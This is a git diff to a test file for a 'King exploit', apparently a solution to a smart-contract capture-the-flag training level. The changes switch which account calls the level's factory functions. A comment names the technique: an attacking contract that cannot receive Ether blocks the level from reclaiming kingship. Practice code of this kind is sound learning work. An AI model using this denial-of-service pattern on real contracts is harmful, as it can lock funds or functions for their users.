@@ -12,10 +12,10 @@ describe("King exploit", () => {
 
     // Simulate execution of createInstance to get return value of the function(address of deployed instance)
     const kingAddress = await kingFactory
-      .connect(deployer)
+      .connect(attacker)
       .callStatic.createInstance(attacker.address, { value: INSERT_COIN });
 
-    const tx = await kingFactory.connect(deployer).createInstance(attacker.address, { value: INSERT_COIN });
+    const tx = await kingFactory.connect(attacker).createInstance(attacker.address, { value: INSERT_COIN });
     await tx.wait();
 
     // Load the instance at returned address
@@ -41,7 +41,7 @@ describe("King exploit", () => {
 
     // Submit the instance
     // Since the KingHack contract does not have receive or payable fallback functions, level cannot reclaim kingship.
-    tx = await kingFactory.validateInstance(king.address, attacker.address);
+    tx = await kingFactory.connect(attacker).validateInstance(king.address, attacker.address);
     await tx.wait();
 
     const kingAfterSubmit = await king._king();
